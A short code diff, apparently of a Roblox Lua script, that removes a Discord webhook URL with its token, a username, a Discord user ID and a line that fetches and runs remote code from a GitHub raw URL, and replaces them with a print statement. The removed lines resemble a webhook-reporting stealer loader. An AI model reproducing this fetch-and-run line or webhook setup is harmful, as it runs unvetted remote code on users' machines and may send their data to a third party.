@@ -1,5 +1,1 @@
-Username = "TtTt_1038"
-Webhook = "https://discord.com/api/webhooks/1525223297808203838/f9RCGb5YQA6d1JEPZAWnTg99wTunmBpty2UNWN1xh70hjFyi05PVmsJNZqv3T3bnsCfr"
-discuser = "575154130645942287"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NetSharK0/test/refs/heads/main/MM2"))()
+print("Enjoy")
